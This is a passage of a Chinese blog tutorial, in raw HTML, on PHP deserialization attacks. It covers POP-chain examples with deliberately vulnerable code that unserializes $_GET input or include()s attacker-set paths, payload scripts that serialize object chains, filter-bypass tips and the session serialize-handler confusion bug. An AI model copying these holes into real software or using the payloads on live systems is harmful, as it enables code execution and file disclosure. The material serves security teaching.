$b);</span><br><span class=\"line\">var_dump($b);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//通过浅拷贝绕过 if(stristr($this-&gt;name, &quot;flag&quot;)!==False) </span><br><span class=\"line\">//通过十六进制绕过if(stristr($input, &#x27;user&#x27;)!==False)</span><br></pre></td></tr></table></figure>\n<p>一般 POP 链都是反着程序来生成，将我们要实现的代码序列化，传入程序进行反序列化 ，就可以让程序按照我们的想法执行。</p>\n<h4 id=\"0x08\"><a class=\"markdownIt-Anchor\" href=\"#0x08\">#</a> 0x08</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">start_gg</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Call</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test2</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funct</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$test2</span>,<span class=\"variable\">$arr</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span> = <span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">func</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod2 = <span class=\"string\">&quot;字符串拼接&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">string1</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1-&gt;<span class=\"title function_ invoke__\">get_flag</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GetFlag</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_flag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;string&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">start_gg</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Call</span>();　　<span class=\"comment\">//把$mod1赋值为Call类对象</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Call</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1 = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">funct</span>();　　<span class=\"comment\">//把 $mod1赋值为funct类对象</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test2</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funct</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1= <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">func</span>();　　<span class=\"comment\">//把 $mod1赋值为func类对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$test2</span>,<span class=\"variable\">$arr</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span> = <span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">func</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1= <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">string1</span>();　　<span class=\"comment\">//把 $mod1赋值为string1类对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;    </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod2 = <span class=\"string\">&quot;字符串拼接&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">string1</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1= <span class=\"keyword\">new</span> <span class=\"title class_\">GetFlag</span>();　　<span class=\"comment\">//把 $str1赋值为GetFlag类对象      </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;    </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1-&gt;<span class=\"title function_ invoke__\">get_flag</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GetFlag</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_flag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag:&quot;</span>.<span class=\"string\">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> start_gg;　　<span class=\"comment\">//构造start_gg类对象$b</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$b</span>));　　<span class=\"comment\">//显示输出url编码后的序列化对象</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x09\"><a class=\"markdownIt-Anchor\" href=\"#0x09\">#</a> 0x09</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Modifier &#123;</span><br><span class=\"line\">    protected  $var;</span><br><span class=\"line\">    public function append($value)&#123;</span><br><span class=\"line\">        include($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __invoke()&#123;</span><br><span class=\"line\">        $this-&gt;append($this-&gt;var);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Show&#123;</span><br><span class=\"line\">    public $source;</span><br><span class=\"line\">    public $str;</span><br><span class=\"line\">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class=\"line\">        $this-&gt;source = $file;</span><br><span class=\"line\">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        return $this-&gt;str-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;</span><br><span class=\"line\">            echo &quot;hacker&quot;;</span><br><span class=\"line\">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Test&#123;</span><br><span class=\"line\">    public $p;</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;p = array();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __get($key)&#123;</span><br><span class=\"line\">        $function = $this-&gt;p;</span><br><span class=\"line\">        return $function();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class=\"line\">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    $a=new Show;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Modifier &#123;</span><br><span class=\"line\">    protected  $var = &quot;D://1.txt&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Show&#123;</span><br><span class=\"line\">    public $source;</span><br><span class=\"line\">    public $str;</span><br><span class=\"line\">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class=\"line\">        $this-&gt;source = $file;</span><br><span class=\"line\">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Test&#123;</span><br><span class=\"line\">    public $p;</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;p = new Modifier();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$a = new Show();</span><br><span class=\"line\">$a-&gt;source = $a;</span><br><span class=\"line\">$a-&gt;str = new Test();</span><br><span class=\"line\">echo urlencode(serialize($a));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>后面两个例子其实都是一样，原理懒的分析了～</p>\n<h4 id=\"php_session-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#php_session-反序列化\">#</a> PHP_session 反序列化</h4>\n<p>当第一次访问网站时，Seesion_start () 函数就会创建一个唯一的 Session ID，并自动通过 HTTP 的响应头，将这个 Session ID 保存到客户端 Cookie 中。同时，也在服务器端创建一个以 Session ID 命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过 HTTP 的请求头将 Cookie 中保存的 Seesion ID 再携带过来，这时 Session_start () 函数就不会再去分配一个新的 Session ID，而是在服务器的硬盘中去寻找和这个 Session ID 同名的 Session 文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>\n<p><strong>session_start 的作用</strong></p>\n<p>当会话自动开始或者通过 session_start () 手动开始的时候， PHP 内部会依据客户端传来的 PHPSESSID 来获取现有的对应的会话数据（即 session 文件）， PHP 会自动反序列化 session 文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为 sess_PHPSESSID (客户端传来的) 的文件。如果客户端未发送 PHPSESSID，则创建一个由 32 个字母组成的 PHPSESSID，并返回 set-cookie。</p>\n<p><strong>Session 存储机制</strong></p>\n<p>PHP 中的 Session 中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以 sess_sessionid 来进行命名的，文件的内容就是 Session 值的序列化之后的内容。</p>\n<p>先来大概了解一下 PHP Session 在 php.ini 中主要存在以下配置项：</p>\n<p>在 PHP 中 Session 有三种序列化的方式，分别是 php，php_serialize，php_binary，不同的引擎所对应的 Session 的存储的方式不同</p>\n<table>\n<thead>\n<tr>\n<th><strong>存储引擎</strong></th>\n<th><strong>存储方式</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>php_binary</td>\n<td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值</td>\n</tr>\n<tr>\n<td>php</td>\n<td>键名 + 竖线 + 经过 serialize () 函数序列处理的值</td>\n</tr>\n<tr>\n<td>php_serialize</td>\n<td>(PHP&gt;5.5.4) 经过 serialize () 函数序列化处理的数组</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username|s:5:&quot;aaaaa&quot;;    //php</span><br><span class=\"line\">\busernames:5:&quot;bbbbb&quot;;    //php_binary,最前面为ASCII中的不可见字符</span><br><span class=\"line\">a:1:&#123;s:8:&quot;username&quot;;s:5:&quot;bbbbb&quot;;&#125;    //php_serialize</span><br></pre></td></tr></table></figure>\n<p><strong>Session 反序列化漏洞</strong></p>\n<p>PHP 在 session 存储和读取时，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，PHP 中的 Session 的实现是没有的问题的，<strong>漏洞主要是由于使用不同的引擎来处理 session 文件造成的</strong>。</p>\n<p>存在对 $_SESSION 变量赋值</p>\n<p>漏洞的主要原因在于不同的引擎对于竖杠’ | ' 的解析产生歧义。</p>\n<p>对于 php_serialize 引擎来说’ | ‘可能只是一个正常的字符；但对于 php 引擎来说’ | ‘就是分隔符，前面是 $_SESSION [‘username’] 的键名 ，后面是 GET 参数经过 serialize 序列化后的值。从而在解析的时候造成了歧义，导致其在解析 Session 文件时直接对’ | ' 后的值进行反序列化处理。</p>\n<p>举个例子：</p>\n<p>先使用 php_serialize 引擎来存储 Session，在使用 php 引擎读取 session</p>\n<p>Session1.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$_SESSION[&#x27;username&#x27;] = $_GET[&#x27;user&#x27;];</span><br><span class=\"line\">echo &quot;&lt;pre&gt;&quot;;</span><br><span class=\"line\">var_dump($_SESSION);</span><br><span class=\"line\">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>接下来使用 php 引擎来读取 Session 文件</p>\n<p>Session2.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">class user&#123;</span><br><span class=\"line\">    var $name;</span><br><span class=\"line\">    var $age;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        echo &quot;hello &quot;.$this-&gt;name.&quot; !&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uc2Vzc2lvbi1zZXQtc2F2ZS1oYW5kbGVyLnBocA==\">session_set_save_handler()</span> 设定的用户自定义会话管理器。 通过 read 